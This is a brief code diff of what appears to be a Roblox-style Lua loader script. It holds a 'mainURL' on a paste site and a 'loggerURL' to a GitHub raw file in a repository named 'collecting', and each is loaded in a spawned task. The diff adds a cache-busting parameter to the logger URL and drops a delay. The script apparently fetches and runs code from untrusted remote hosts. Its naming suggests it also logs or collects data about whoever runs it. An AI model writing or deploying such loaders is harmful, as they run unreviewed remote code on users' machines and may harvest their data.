@@ -1,5 +1,5 @@
 local mainURL   = "https://paste.fe4r.click/raw/189ebddd-83e1-4a48-b6e4-4a5923f37f7a"
-local loggerURL = "https://raw.githubusercontent.com/pioluuu/collecting/refs/heads/main/claimed"
+local loggerURL = "https://raw.githubusercontent.com/pioluuu/collecting/refs/heads/main/claimed?v=8"
 
 task.spawn(function()
     local ok, err = pcall(function()
@@ -9,8 +9,6 @@ task.spawn(function()
         warn("[Main] Load failed:", err)
     end
 end)
-
-task.wait(1)
 
 task.spawn(function()
     local ok, err = pcall(function()
